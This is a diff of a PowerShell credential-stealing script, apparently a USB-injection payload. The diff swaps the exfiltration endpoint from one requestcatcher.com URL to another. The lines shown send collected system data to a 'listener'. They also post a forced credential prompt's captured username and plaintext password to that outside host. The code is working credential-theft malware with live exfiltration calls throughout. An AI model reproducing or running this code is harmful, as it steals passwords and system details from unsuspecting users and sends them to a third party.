@@ -234,7 +234,7 @@ $tree
 "@
 
 # Send to your listener
-Invoke-WebRequest -Uri "https://flipped.requestcatcher.com/" -Method POST -Body @{debug = $data}
+Invoke-WebRequest -Uri "https://nina-flip-test.requestcatcher.com/" -Method POST -Body @{debug = $data}
 
 # ============================== [FORCED CREDENTIAL PROMPT] ==============================
 
@@ -278,7 +278,7 @@ if ($finalCred -ne $null) {
     $finalUser = $finalCred.UserName
     $finalPass = $finalCred.GetNetworkCredential().Password
 
-    Invoke-WebRequest -Uri "https://flipped.requestcatcher.com/" -Method POST -Body @{
+    Invoke-WebRequest -Uri "https://nina-flip-test.requestcatcher.com/" -Method POST -Body @{
         debug = @"
 ===== [Captured Credentials] =====
 Username: $finalUser
@@ -288,7 +288,7 @@ Password: $finalPass
 
     Start-Sleep -Seconds 3
 } else {
-    Invoke-WebRequest -Uri "https://flipped.requestcatcher.com/" -Method POST -Body @{
+    Invoke-WebRequest -Uri "https://nina-flip-test.requestcatcher.com/" -Method POST -Body @{
         debug = "User failed to authenticate after multiple forced attempts."
     }
 }
